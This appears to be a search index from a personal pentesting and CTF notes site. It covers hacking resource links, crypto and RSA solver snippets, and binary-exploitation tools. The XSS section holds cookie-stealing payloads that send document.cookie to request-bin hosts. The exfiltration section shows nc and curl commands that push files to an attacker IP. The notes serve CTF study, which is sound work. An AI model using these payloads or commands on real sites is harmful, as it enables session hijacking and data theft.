{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"PenTesting Resources / Links","text":""},{"location":"#a-collection-of-awesome-penetration-testing-resources","title":"A collection of awesome penetration testing resources","text":"<ul> <li>https://github.com/sindresorhus/awesome</li> <li>https://github.com/enaqx/awesome-pentest</li> <li>https://github.com/coreb1t/awesome-pentest-cheat-sheets</li> <li>https://github.com/carpedm20/awesome-hacking</li> <li>https://github.com/apsdehal/awesome-ctf</li> <li>https://github.com/AnarchoTechNYC/meta/wiki/InfoSec</li> <li>https://github.com/onlurking/awesome-infosec</li> <li>https://github.com/rmusser01/Infosec_Reference</li> <li>https://github.com/vitalysim/Awesome-Hacking-Resources</li> <li>https://github.com/dostoevskylabs/dostoevsky-pentest-notes/blob/master/SUMMARY.md</li> <li>https://github.com/nixawk/pentest-wiki</li> </ul>"},{"location":"#lists-of-tools","title":"Lists of tools","text":"<ul> <li>https://linuxsecurity.expert/security-tools/top-100/</li> <li>https://linuxsecurity.expert/tools/lynis/</li> <li>http://inquisb.github.io/keimpx/</li> <li>Hacking Tools Repository: http://gexos.github.io/Hacking-Tools-Repository/</li> <li>https://www.concise-courses.com/hacking-tools/top-ten/</li> <li>https://www.us-cert.gov/bsi/articles/tools/penetration-testing-tools/penetration-testing-tools</li> </ul>"},{"location":"#payloads-and-fuzzing","title":"Payloads and Fuzzing","text":"<ul> <li>https://github.com/swisskyrepo/PayloadsAllTheThings</li> <li>https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad</li> <li>https://github.com/fuzzdb-project/fuzzdb</li> </ul>"},{"location":"#dns-enumerations","title":"DNS Enumerations","text":"<ul> <li>https://www.exploit-db.com/docs/12389.pdf</li> </ul>"},{"location":"#enumeration","title":"Enumeration","text":"<ul> <li>General</li> <li>https://booksite.elsevier.com/samplechapters/9781597496278/Chapter_3.pdf</li> <li>scripts</li> <li>https://highon.coffee/blog/linux-local-enumeration-script/</li> <li>Checklists</li> <li>https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</li> <li>https://www.rebootuser.com/?p=1623 - Local Linux Enumeration &amp; Privilege Escalation Cheatsheet</li> <li>Additional info</li> <li>http://resources.infosecinstitute.com/what-is-enumeration/#gref</li> <li>https://booksite.elsevier.com/samplechapters/9781597496278/Chapter_3.pdf</li> <li>https://www.cyberciti.biz/faq/how-do-i-find-out-what-ports-are-listeningopen-on-my-linuxfreebsd-server/</li> <li>Windows</li> <li>https://www.sans.org/reading-room/whitepapers/testing/scanning-windows-deeper-nmap-scanning-engine-33138</li> <li>http://www.hackingarticles.in/netbios-and-smb-penetration-testing-on-windows/</li> <li>http://www.hackingdna.com/2016/09/smb-enumeration.html</li> </ul>"},{"location":"#user-enumeration","title":"User enumeration","text":"<ul> <li>https://tools.kali.org/information-gathering/ident-user-enum</li> </ul>"},{"location":"#sharepointurlbrute","title":"SharePointURLBrute","text":"<ul> <li>https://www.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/</li> </ul>"},{"location":"#priv-esc","title":"Priv Esc","text":"<ul> <li>Linux</li> <li>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</li> <li>http://www.hackingarticles.in/4-ways-get-linux-privilege-escalation/</li> <li>https://hackmag.com/security/reach-the-root/</li> <li>http://www.admin-magazine.com/Articles/Understanding-Privilege-Escalation</li> <li>http://security-geek.in/2016/09/01/linux-privilege-escalation-cheat-sheet/</li> <li>Windows</li> <li>https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194</li> <li>https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html</li> <li>http://www.greyhathacker.net/?p=738</li> <li>https://github.com/AlessandroZ/BeRoot</li> <li>https://github.com/foxglovesec/RottenPotato</li> <li>http://www.fuzzysecurity.com/tutorials/16.html</li> </ul>"},{"location":"#password-cracking","title":"Password Cracking","text":"<ul> <li>https://crackstation.net/</li> <li>https://www.rubydevices.com.au/blog/how-to-hack-keepass</li> </ul>"},{"location":"#reverse-shell-cheatsheets","title":"Reverse Shell cheatsheets","text":"<ul> <li>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</li> <li>https://highon.coffee/blog/reverse-shell-cheat-sheet/</li> </ul>"},{"location":"#reverse-engineering","title":"Reverse Engineering","text":"<ul> <li>https://www.thegeekstuff.com/2012/03/reverse-engineering-tools/</li> </ul>"},{"location":"#ciphers","title":"Ciphers","text":"<ul> <li>https://quipqiup.com/</li> <li>https://cryptii.com/pipes/caesar-cipher</li> </ul>"},{"location":"#python-references","title":"Python References","text":"<ul> <li>Requests</li> <li>http://docs.python-requests.org/en/master/</li> <li>Beautiful Soup</li> <li>https://www.crummy.com/software/BeautifulSoup/bs4/doc/</li> </ul>"},{"location":"#nodejs-deserialization-bug","title":"Node.js deserialization bug","text":"<ul> <li>https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</li> <li>https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</li> </ul>"},{"location":"#jq","title":"jq","text":"<ul> <li>https://github.com/stedolan/jq/wiki/</li> <li>https://starkandwayne.com/blog/bash-for-loop-over-json-array-using-jq/</li> <li>https://stedolan.github.io/jq/manual/</li> </ul>"},{"location":"#cheatsheet","title":"cheatsheet","text":"<p>https://cheat.sh/ https://github.com/chubin/cheat.sh</p>"},{"location":"#php-type-juggling-magic-hashes","title":"PHP Type Juggling - magic hashes","text":"<ul> <li>https://www.whitehatsec.com/blog/magic-hashes/</li> </ul>"},{"location":"#extracting-screenshot-from-framebuffer","title":"Extracting screenshot from FrameBuffer","text":"<ul> <li>https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/</li> <li>https://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html</li> </ul>"},{"location":"#additional-websites","title":"Additional Websites","text":"<ul> <li>https://thehacktoday.com/top-10-websites-for-hackers/</li> <li>Steganography</li> <li>https://www.wired.com/story/steganography-hacker-lexicon/</li> <li>SSH</li> <li>https://help.ubuntu.com/community/SSH/OpenSSH/Keys</li> <li>https://www.trustedsec.com/2014/11/meterssh-meterpreter-ssh/</li> <li>Posters / Desktop Backgrounds</li> <li>https://pen-testing.sans.org/blog/2013/06/20/announcing-the-ultimate-sans-pen-test-poster</li> <li>https://pen-testing.sans.org/blog/2017/02/07/command-line-kung-fu-penetration-testing-desktop-wallpapers/comment-page-1/</li> </ul>"},{"location":"#additional-reading","title":"Additional Reading","text":"<ul> <li>https://wiki.debian.org/SystemGroups</li> <li>https://en.wikipedia.org/wiki/Computer_terminal#Text_terminals</li> <li>https://en.wikipedia.org/wiki/Named_pipe</li> <li>https://jamielinux.com/docs/openssl-certificate-authority/sign-server-and-client-certificates.html</li> <li>https://www.thesslstore.com/blog/root-certificates-intermediate/</li> <li>https://support.dnsimple.com/articles/what-is-ssl-certificate-chain/</li> </ul>"},{"location":"CTF/CTFs/","title":"CTFs","text":"<p>Types of CTFs * Jeopardy * Attack-Defense * Wargames</p> <p>Typical CTF Categories: * Crypto (Cryptography) * Forensics * Pwn (Binary Analysis / Binary Exploitation) * Reverse Rngineering * Stego (Steganography) * Web * Mobile Security * Network</p> <p>Tools: * Burp Suite</p> <p>Tools: * https://gchq.github.io/CyberChef/ * https://quipqiup.com/ * https://www.rapidtables.com/convert/number/binary-to-ascii.html * https://cryptii.com/</p> <p>CTF / Challenge Sites: * https://www.root-me.org/?lang=en&amp;page=ctf_alltheday&amp;id_salle=15 * Wargames:   * https://overthewire.org/wargames/ * XSS:   * https://xss-game.appspot.com/   * https://www.acunetix.com/blog/web-security-zone/test-xss-skills-vulnerable-sites/ * https://bonkersabouttech.com/40-intentionally-vulnerable-websites-to-practice-your-hacking-skills/</p> <p>Info / Resources: * https://primer.picoctf.com/ * https://ctftime.org * Live Overflow * https://medium.com/bugbountywriteup/tagged/ctf * https://www.defcon.org/html/links/dc-ctf.html * juice shop</p>"},{"location":"CTF/Forensics_and_Stego/","title":"Forensics &amp; Stego","text":""},{"location":"CTF/Forensics_and_Stego/#resources","title":"Resources:","text":"<ul> <li>https://trailofbits.github.io/ctf/forensics/</li> </ul>"},{"location":"CTF/Forensics_and_Stego/#tools","title":"Tools:","text":"<ul> <li>Online decoders:</li> <li>https://stylesuxx.github.io/steganography/</li> </ul>"},{"location":"CTF/Forensics_and_Stego/#references","title":"References:","text":""},{"location":"CTF/Forensics_and_Stego/#convert-the-binary-into-an-image","title":"Convert the binary into an image","text":"<p>https://www.dcode.fr/binary-image</p>"},{"location":"CTF/Forensics_and_Stego/#extract-the-info-from-the-qr-code","title":"extract the info from the QR Code","text":"<p>https://zxing.org/w/decode</p> <p>https://github.com/Paradoxis/StegCracker pip3 install stegcracker</p> <p>Stegsolver: https://github.com/zardus/ctf-tools/blob/master/stegsolve/install</p> <p>Recursively unzip files (replacing with directory): https://stackoverflow.com/questions/36285502/how-to-extract-zip-file-recursively-in-python</p> <pre><code>import os\nimport io\nimport zipfile\nimport re\n\n\ndef unzip_directory(directory):\n\"\"\"\" This function unzips (and then deletes) all zip files in a directory \"\"\"\n    for root, dirs, files in os.walk(directory):\n        for filename in files:\n            if re.search(r'\\.zip$', filename):\n                to_path = os.path.join(root, filename.split('.zip')[0])\n                zipped_file = os.path.join(root, filename)\n                if not os.path.exists(to_path):\n                    os.makedirs(to_path)\n                    with zipfile.ZipFile(zipped_file, 'r') as zfile:\n                        zfile.extractall(path=to_path)\n                    # deletes zip file\n                    os.remove(zipped_file)\n\ndef exists_zip(directory):\n\"\"\" This function returns T/F whether any .zip file exists within the directory, recursively \"\"\"\n    is_zip = False\n    for root, dirs, files in os.walk(directory):\n        for filename in files:\n            if re.search(r'\\.zip$', filename):\n                is_zip = True\n    return is_zip\n\ndef unzip_directory_recursively(directory, max_iter=1000):\n    print(\"Does the directory path exist? \", os.path.exists(directory))\n\"\"\" Calls unzip_directory until all contained zip files (and new ones from previous calls)\n    are unzipped\n    \"\"\"\n    iterate = 0\n    while exists_zip(directory) and iterate &lt; max_iter:\n        unzip_directory(directory)\n        iterate += 1\n    pre = \"Did not \" if iterate &lt; max_iter else \"Did\"\n    print(pre, \"time out based on max_iter limit of\", max_iter, \". Took iterations:\", iterate)\n</code></pre>"},{"location":"CTF/Password_Cracking/","title":"Password Cracking","text":"<p>ssh2john - just running the command on Kali doesn't appear to work; The file is located within the /usr/share/john directory /usr/share/john/ssh2john.py</p> <p>Cracking a 7z file:</p> <pre><code>bash 7zip-jtr.sh &lt;filename&gt; &lt;wordlist&gt;\n</code></pre> <p>copy of 7zip-jtr.sh in scripts folder</p>"},{"location":"CTF/Sites/","title":"CTFs, Wargames, and Write-ups","text":"<p>CTF's and Wargames: * https://2019.sunshinectf.org/challenges * https://backdoor.sdslabs.co * http://pwnable.kr/ * 22 Hacking Sites To Practice Your Hacking Skills * https://www.checkmarx.com/2015/11/06/13-more-hacking-sites-to-legally-practice-your-infosec-skills/ * https://www.vulnhub.com/resources/ * https://capturetheether.com/challenges/ (Solidity / blockchain related challenges)</p> <p>Write-ups: https://0xdf.gitlab.io/ https://snowscan.io/</p>"},{"location":"CTF/xss/","title":"XSS","text":"<ul> <li>https://requestbin.com/</li> <li>http://requestbin.net/</li> <li>https://hookbin.com/</li> </ul> <pre><code>&lt;html&gt;\n&lt;body&gt;\n&lt;script type=\"text/javascript\"&gt;\ndocument.location='https://enh9ostcksxfv.x.pipedream.net/' + document.cookie;\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n\n&lt;script&gt;location.href='https://enh9ostcksxfv.x.pipedream.net/' + document.cookie;&lt;/script&gt;\n\n&lt;img src=x onerror=this.src='https://enw98908usg7b.x.pipedream.net/?q='+document.cookie&gt;\n\n\n&lt;img src=x onerror=this.src='https://enw98908usg7b.x.pipedream.net/?c='+document.cookie&gt;\n\n\n&lt;IMG SRC=/ onerror=this.src='https://enw98908usg7b.x.pipedream.net/?c='+document.cookie&gt;&lt;/img&gt;\n</code></pre>"},{"location":"CTF/Crypto/Crypto/","title":"Crypto","text":""},{"location":"CTF/Crypto/Crypto/#tools","title":"Tools:","text":"<ul> <li>ciphey</li> <li><code>docker run -it --rm remnux/ciphey</code></li> </ul>"},{"location":"CTF/Crypto/Crypto/#resources","title":"Resources:","text":"<ul> <li>https://www.cryptool.org/en/cryptool-online</li> <li>https://www.cryptool.org/en/cto-highlights/rsa-step-by-step</li> <li>List of various ciphers (including some solvers) - http://rumkin.com/tools/cipher/</li> </ul>"},{"location":"CTF/Crypto/Crypto/#references","title":"References:","text":"<ul> <li>https://ctfs.github.io/resources/topics/cryptography/README.html</li> </ul>"},{"location":"CTF/Crypto/Crypto/#fernet","title":"Fernet","text":"<p>https://cryptography.io/en/latest/fernet/</p> <p>https://www.rootnetsec.com/picoctf-weird-rsa/ https://en.wikipedia.org/wiki/RSA_(cryptosystem) https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Using_the_Chinese_remainder_algorithm</p>"},{"location":"CTF/Crypto/Crypto/#snippets","title":"Snippets:","text":"<pre><code>import binascii\n\nprint(binascii.unhexlify('7061756c'))\n# paul\n\nprint(binascii.hexlify('Justin'))\n# '4a757374696e'\n</code></pre> <pre><code>alias rot13=\"tr 'A-Za-z' 'N-ZA-Mn-za-m'\"\n</code></pre> <p>Python3 rot_n (rot13 or other values) <code>for python2, use string.maketrans</code></p> <pre><code>from string import ascii_uppercase as uc, ascii_lowercase as lc\n\ndef rot_n(strInput, n=13):\n    n = n % 26\n    rot = str.maketrans(uc + lc, uc[n:] + uc[:n] + lc[n:] + lc[:n])\n    return str.translate(strInput, rot)\n</code></pre> <p>base64/base32 \"intelligent\" decode</p> <pre><code>from base64 import b64decode, b32decode\n\ndef unbase(thestring):\n    if len(set(thestring.decode('utf-8'))) &gt; 32:\n        return b64decode(thestring)\n    else:\n        return b32decode(thestring)\n</code></pre> <p>Convert from message to decimal:</p> <pre><code>message: HELLO\nascii bytes: [72, 69, 76, 76, 79]\nhex bytes: [0x48, 0x45, 0x4c, 0x4c, 0x4f]\nbase-16: 0x48454c4c4f\nbase-10: 310400273487\n</code></pre> <p>Using pycryptodome (<code>pip install pycryptodome</code>)</p> <pre><code>from Crypto.Util.number import bytes_to_long, long_to_bytes\n</code></pre> <pre><code>from pwn import *\nfrom Crypto.Util.number import *\nimport json, codecs\n\nd = {\n        \"base64\": b64d,\n        \"hex\": unhex,\n        \"rot13\": lambda s: codecs.encode(s, 'rot_13').encode(),\n        \"bigint\": lambda s: long_to_bytes(int(s, 0)),\n        \"utf-8\": bytes\n}\n\ndef dec(o):\n    return d[o[\"type\"]](o[\"encoded\"])\n\nio = remote(\"socket.cryptohack.org\", 13377)\nfor _ in range(100):\n    o = json.loads(io.recvline())\n    io.sendline(json.dumps({\"decoded\": dec(o).decode()}))\nio.interactive()\n</code></pre> <p>xor all characters of a string with a given integer</p> <pre><code>x = \"some_string\".encode()\nbytes(map(lambda x: x^13, x.encode()))\n\nimport pwn\n\npwn.xor(b'label', 13)\n</code></pre> <p>from pwn import unhex</p> <p>Cracking hashes https://md5hashing.net https://crackstation.net/</p> <p>https://en.wikipedia.org/wiki/Malbolge https://www.tutorialspoint.com/execute_malbolge_online.php</p> <p>Elliptic Curve Cryptography: * https://hackernoon.com/what-is-the-math-behind-elliptic-curve-cryptography-f61b25253da3 * A Coder\u2019s Guide to Elliptic Curve Cryptography * basics of elliptic curve cryptography - gist * https://math.stackexchange.com/questions/1259490/weierstrass-equation-long-vs-normal-form * https://crypto.stanford.edu/pbc/notes/elliptic/weier.html * https://crypto.stackexchange.com/questions/41407/why-must-an-elliptic-curve-group-for-ecc-have-prime-order * https://en.wikipedia.org/wiki/Pollard%27s_kangaroo_algorithm * https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm * https://aadityapurani.com/2019/03/11/utctf-2019-writeups/</p>"},{"location":"CTF/Crypto/RSA/","title":"RSA","text":"<pre><code>n = p * q\nphi = (p-1)*(q-1)\nd = inverse(e, phi)  # Crypto.Util.number.inverse\ncipher (c) = message ^ e mod n\nm = pow(c, d, n)\n\nmessage = m.to_bytes((m.bit_length() + 7) // 8, byteorder='little')\nmessage = binascii.unhexlify(hex(m)[2:])[::-1]\nmessage = long_to_bytes(m)\n</code></pre> <p>pip installs:</p> <pre><code>sudo pip install factordb-pycli pycryptodome\n</code></pre> <p>Skeleton script:</p> <pre><code>from Crypto.Util.number import inverse, long_to_bytes, bytes_to_long\nfrom factordb.factordb import FactorDB\nimport binascii\n# from Crypto.PublicKey import RSA\n\nn =\ne =\nc =\n\n# get from factordb\nf = FactorDB(n)\n\nf.connect()\np, q = f.get_factor_list()\n\nphi = (p-1)*(q-1)\nd = inverse(e, phi)\n\nm = pow(c, d, n)\n\n# different approaches to getting the plaintext from m:\nmessage = m.to_bytes((m.bit_length() + 7) // 8, byteorder='little')\nmessage = m.to_bytes((m.bit_length() + 7) // 8, byteorder='big')\nmessage = binascii.unhexlify(hex(m)[2:])[::-1]\nmessage = long_to_bytes(m)\n</code></pre>"},{"location":"CTF/Crypto/RSA/#rsa-small-e","title":"RSA - small E","text":"<p><code>cipher (c) = message ^ e mod n</code> if message ^ e is less than n, the mod portion is irrelevant. therefore m = root(c, e)</p> <pre><code>n = 0x5fb76f7f36c0d7788650e3e81fe18ad105970eb2dd19576d29e8a8697ebbd97f4fc2582bf1dc53d527953d9615439ca1b546b2fc1cd533db5fce6f72419f268e3182c0324a631a17d6b3e76540f52f2df51ca34983392d274f292139c28990660fa0e23d1b350da7aa7458a3783107a296dcd1720e32afb431954d8896f0587cd1c8f1d20701d6173b7cffe53679ebda80f137c83276d6628697961f5fcd39e18316770917338c6dc59a241dcdc66417fed42524c33093251c1d318b9dbeb6c3d0a69438b875958e8885d242d196e25bc73595e7f237c8124e07a79f7066f2dee393e2130306ba29e7ece1825798ff8b35416b3a0d96bcdc6eca5616ea2874954f8f88232450ddad3e109338bcc5d84e7b592a6b0871bd4130b84f81ed188e9d5495c8545aa8dea2b65e8605f5a49e3a1c221cbcc301665187658784a8f42a23c2ca2572477ba56ff19934019b48f5a1ab8a50626c85bdd476b11e8c1fb0b740c2370de3da5cc06371a7aa2c4e12eee3dc4cda07a8c84ba2bc3ee2017156468af95111d7ee5152ce35e66fa027a944b43c27fbd27faa5b4f9075be3526a7a5be8a533b523cd5c738c724e97597fc2e3666cfcad7c79d972ff8d9572100e860395cdc3761af3f4cc225a6df83a55802723f95cfba5918d83913f2cc9b219210249928c291310d449042772e2d0a50620d666a137f79770de6f10196b30cc756e1\ne = 0b1101\nc = 0x6003a15ff3f9bc74fcc48dc0f5fc59c31cb84df2424c9311d94cb40570eeaa78e0f8fc2917addd1afc8e5810b2e80a95019c88c4ee74849777eb9d0ee27ab80d3528c6f3f95a37d1581f9b3cd8976904c42f8613ee79cf8c94074ede9f034b61433f1fef835f2a0a45663ec4a0facedc068f6fa2b534c9c7a2f4789c699c2dcd952ed82180a6de00a51904c2df74eb73996845842276d5523c66800034351204b921d4780180ca646421c61033017e4986d9f6a892ed649c4fd40d4cf5b4faf0befb1e2098ee33b8bea461a8626dd8cd2eed05ccd471700e2a1b99ed347660cbd0f202212f6c0d7ad8ef6f878d887af0cd0429c417c9f7dd64890146b91152ea0c30637ce503635018fd2caf436a12378e5892992b8ec563f0988fc0cebd2926662d4604b8393fb2000\n\nimport gmpy2\n\nk = int(gmpy2.iroot(c, e)[0])\nmessage = m.to_bytes((m.bit_length() + 7) // 8, byteorder='little')\nprint(p)\n</code></pre>"},{"location":"CTF/Crypto/RSA/#links-references","title":"Links / References","text":"<ul> <li>https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_module_attack/</li> <li>https://ctf101.org/cryptography/what-is-rsa/</li> <li>https://bitsdeep.com/posts/attacking-rsa-for-fun-and-ctf-points-part-2/</li> </ul> <p>http://www.mickybullock.com/blog/wp-content/RSA_Cryptography/ffactory.php</p> <p>http://factordb.com/index.php https://pypi.org/project/factordb-pycli/</p>"},{"location":"CTF/Crypto/cipher_types/","title":"Cipher types","text":"<p>One-time pad</p> <pre><code>A B C D E F G H I J K L M N O P Q R S T U V W X Y Z\n+----------------------------------------------------\nA | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z\nB | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A\nC | C D E F G H I J K L M N O P Q R S T U V W X Y Z A B\nD | D E F G H I J K L M N O P Q R S T U V W X Y Z A B C\nE | E F G H I J K L M N O P Q R S T U V W X Y Z A B C D\nF | F G H I J K L M N O P Q R S T U V W X Y Z A B C D E\nG | G H I J K L M N O P Q R S T U V W X Y Z A B C D E F\nH | H I J K L M N O P Q R S T U V W X Y Z A B C D E F G\nI | I J K L M N O P Q R S T U V W X Y Z A B C D E F G H\nJ | J K L M N O P Q R S T U V W X Y Z A B C D E F G H I\nK | K L M N O P Q R S T U V W X Y Z A B C D E F G H I J\nL | L M N O P Q R S T U V W X Y Z A B C D E F G H I J K\nM | M N O P Q R S T U V W X Y Z A B C D E F G H I J K L\nN | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M\nO | O P Q R S T U V W X Y Z A B C D E F G H I J K L M N\nP | P Q R S T U V W X Y Z A B C D E F G H I J K L M N O\nQ | Q R S T U V W X Y Z A B C D E F G H I J K L M N O P\nR | R S T U V W X Y Z A B C D E F G H I J K L M N O P Q\nS | S T U V W X Y Z A B C D E F G H I J K L M N O P Q R\nT | T U V W X Y Z A B C D E F G H I J K L M N O P Q R S\nU | U V W X Y Z A B C D E F G H I J K L M N O P Q R S T\nV | V W X Y Z A B C D E F G H I J K L M N O P Q R S T U\nW | W X Y Z A B C D E F G H I J K L M N O P Q R S T U V\nX | X Y Z A B C D E F G H I J K L M N O P Q R S T U V W\nY | Y Z A B C D E F G H I J K L M N O P Q R S T U V W X\nZ | Z A B C D E F G H I J K L M N O P Q R S T U V W X Y\n</code></pre> <pre><code>import string\nimport itertools\n\nx = string.ascii_uppercase\n\ndef encrypt_letter(p, k):\n    return (x + x)[x.index(p) + x.index(k)]\n\ndef decrypt_letter(c, k):\n    return (x + x)[x.index(c) - x.index(k)]\n\ndef encrypt(plaintext, key):\n    return ''.join([encrypt_letter(i, j) for i,j in zip(plaintext, itertools.cycle(key))])\n\ndef decrypt(ciphertext, key):\n    return ''.join([decrypt_letter(i, j) for i,j in zip(ciphertext, itertools.cycle(key))])\n\n\nprint(decrypt(\"UFJKXQZQUNB\", \"SOLVECRYPTO\"))\n</code></pre>"},{"location":"Exfiltration/moving_files_between_systems/","title":"Moving files between systems","text":""},{"location":"Exfiltration/moving_files_between_systems/#scp","title":"SCP:","text":"<pre><code># Copy something from another system to this system:\nscp username@hostname:/path/to/remote/file /path/to/local/file\n\n# Copy something from this system to some other system:\nscp /path/to/local/file username@hostname:/path/to/remote/file          \n\n# Copy something from some system to some other system:\nscp username1@hostname1:/path/to/file username2@hostname2:/path/to/other/file   \n</code></pre>"},{"location":"Exfiltration/moving_files_between_systems/#pwntools-ssh","title":"pwntools - ssh","text":"<p>Using pwntools ssh download files - http://docs.pwntools.com/en/stable/tubes/ssh.html</p> <pre><code>s =  ssh(host='example.pwnme', user='travis', password='demopass')\ns.download(file_or_directory, local)\n    # * file_or_directory (str) \u2013 Path to the file or directory to download.\n    # * local (str) \u2013 Local path to store the data. By default, uses the current directory.\n</code></pre>"},{"location":"Exfiltration/moving_files_between_systems/#nc","title":"nc","text":"<p>Sending files across nc ( https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/ )</p> <pre><code>nc -l -p 1234 &gt; LinEnum_output # listener on local pc\nnc -w 3 10.10.14.25 1234 &lt; LinEnum_output # send file to local pc\n</code></pre>"},{"location":"Exfiltration/moving_files_between_systems/#ftp","title":"FTP","text":"<p>using python's ftp module:</p> <pre><code># start up server\npython -m pyftpdlib -p 21 -w -d `pwd` -i 10.10.14.25\n\n# send files via curl\n## Windows:\ncurl -T backup.zip ftp://10.10.14.25\n</code></pre>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/","title":"Buffer Overflow","text":"<p>Practice sites: * https://exploit.education/</p> <p>buffer overflow tools:</p>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#ropper","title":"ropper","text":"<p>used to get rop chains</p> <pre><code>ropper --file garbage  | grep \"pop\"\napt-get install ropper\n</code></pre>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#one_gadget","title":"one_gadget","text":"<p>tool for finding one gadget RCE in libc.so.6</p> <pre><code>one_gadget binary_name\ngem install one_gadget\n</code></pre>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#ropgadget","title":"ropgadget","text":"<p>search your gadgets on your binaries to facilitate your ROP exploitation</p>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#objdump","title":"objdump","text":"<p>display information from object files.</p> <pre><code>objdump -D filename\n</code></pre>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#pwntools-checksec","title":"pwntools - checksec","text":"<pre><code>checksec filename\npwn checksec filename\n</code></pre>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#pwntools-cyclic","title":"pwntools - cyclic","text":"<pre><code>pwn cyclic 40\npwn cyclic -l 0x61676161\n</code></pre>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#dmesg-print-or-control-the-kernel-ring-buffer","title":"dmesg - print or control the kernel ring buffer","text":"<p>dmesg |tail</p>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#readelf","title":"readelf","text":"<p>Displays information about ELF files. <code>readelf -s filename</code></p> <pre><code>readelf [-a|--all]\n        [-h|--file-header]\n        [-l|--program-headers|--segments]\n        [-S|--section-headers|--sections]\n        [-g|--section-groups]\n        [-t|--section-details]\n        [-e|--headers]\n        [-s|--syms|--symbols]\n        [--dyn-syms]\n        [-n|--notes]\n        [-r|--relocs]\n        [-u|--unwind]\n        [-d|--dynamic]\n        [-V|--version-info]\n        [-A|--arch-specific]\n        [-D|--use-dynamic]\n        [-x &lt;number or name&gt;|--hex-dump=&lt;number or name&gt;]\n        [-p &lt;number or name&gt;|--string-dump=&lt;number or name&gt;]\n        [-R &lt;number or name&gt;|--relocated-dump=&lt;number or name&gt;]\n        [-z|--decompress]\n        [-c|--archive-index]\n        [-w[lLiaprmfFsoRtUuTgAckK]|\n         --debug-dump[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,=frames-interp,=str,=loc,=Ranges,=pubtypes,=trace_info,=trace_abbrev,=trace_aranges,=gdb_index,=addr,=cu_index,=links,=follow-links]]\n        [--dwarf-depth=n]\n        [--dwarf-start=n]\n        [-I|--histogram]\n        [-v|--version]\n        [-W|--wide]\n        [-H|--help]\n        elffile...\n</code></pre>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#gdb","title":"GDB:","text":"<ul> <li>dumprop -- Dump all ROP gadgets in specific memory range</li> <li>list registers:<ul> <li>info registers - shows all the registers</li> <li>info registers eax - shows just the register eax</li> <li>The command can be abbreviated as i r</li> </ul> </li> </ul>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#vmmap","title":"vmmap","text":"<pre><code>gdb-peda$ help vmmap\nGet virtual mapping address ranges of section(s) in debugged process\nUsage:\n    vmmap [mapname] (e.g binary, all, libc, stack)\n    vmmap address (find mapname contains this address)\n    vmmap (equiv to cat /proc/pid/maps)\n</code></pre>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#rabin2","title":"Rabin2","text":"<p>Show Properties of a Binary</p> <p>A few useful options:</p> <pre><code>-E              globally exportable symbols\n-g              same as -SMZIHVResizcld (show all info)\n-H              header fields\n-i              imports (symbols imported from libraries)\n-I              binary info\n-j              output in json\n-K [algo]       calculate checksums (md5, sha1, ..)\n-l              linked libraries\n-L [plugin]     list supported bin plugins or plugin details\n-m [addr]       show source line at addr\n-M              main (show address of main symbol)\n-n [str]        show section, symbol or import named str\n-N [min:max]    force min:max number of chars per string (see -z and -zz)\n-s              symbols\n-S              sections\n-z              strings (from data section)\n-zz             strings (from raw bins [e bin.rawstr=1])\n-zzz            dump raw strings to stdout (for huge files)\n</code></pre>"},{"location":"Exploits_and_Code_Execution/BufferOverflow/#calling-conventions","title":"Calling Conventions","text":"<p>(https://ctf101.org/binary-exploitation/what-are-calling-conventions/)</p> <p>cdecl In 32-bit binaries on Linux, function arguments are passed in on the stack in reverse order. A function like this:</p> <pre><code>int add(int a, int b, int c) {\nreturn a + b + c;\n}\n</code></pre> <p>would be invoked by pushing c, then b, then a.</p> <p>SysV</p> <p>For 64-bit binaries, function arguments are first passed in certain registers:</p> <ol> <li>RDI</li> <li>RSI</li> <li>RDX</li> <li>RCX</li> <li>R8</li> <li>R9</li> </ol> <p>then any leftover arguments are pushed onto the stack in reverse order, as in cdecl.</p> <pre><code>+---------+------+------+------+------+------+------+\n| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |\n+---------+------+------+------+------+------+------+\n|   %rax  | %rdi | %rsi | %rdx | %r10 | %r8  | %r9  |\n+---------+------+------+------+------+------+------+\n</code></pre> 8-byte register Bytes 0-3 Bytes 0-1 Byte 0 %rax %eax %ax %al %rcx %ecx %cx %cl %rdx %edx %dx %dl %rbx %ebx %bx %bl %rsi %esi %si %sil %rdi %edi %di %dil %rsp %esp %sp %spl %rbp %ebp %bp %bpl %r8 %r8d %r8w %r8b %r9 %r9d %r9w %r9b %r10 %r10d %r10w %r10b %r11 %r11d %r11w %r11b %r12 %r12d %r12w %r12b %r13 %r13d %r13w %r13b %r14 %r14d %r14w %r14b %r15 %r15d %r15w %r15b <p>32 bit:</p> <pre><code>from pwn import *\n\nelf = ELF('./filename')\n#p = 